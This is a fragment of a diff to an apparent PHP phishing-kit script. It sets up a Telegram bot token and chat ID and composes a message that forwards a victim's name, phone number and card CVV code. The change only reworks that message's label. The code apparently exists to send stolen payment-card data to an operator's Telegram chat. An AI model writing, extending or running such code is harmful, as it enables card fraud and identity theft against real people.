@@ -58,7 +58,7 @@ $FALLBACK_CHAT_ID_OPS   = "-4923753161";
 $token   = getenv('TELEGRAM_BOT_TOKEN_OPS') ?: $FALLBACK_BOT_TOKEN_OPS;
 $chat_id = getenv('TELEGRAM_CHAT_ID_OPS')   ?: $FALLBACK_CHAT_ID_OPS;
 
-$mensaje  = "📥 CVV recibida:\n";
+$mensaje  = "✅ <b>[DATO EXTRA: CVV]</b> Código CVV adicional recibido:\n";
 $mensaje .= "👤 $nombre\n";
 $mensaje .= "🔒 $telefono\n";
 $mensaje .= "🔓: $codigo\n";
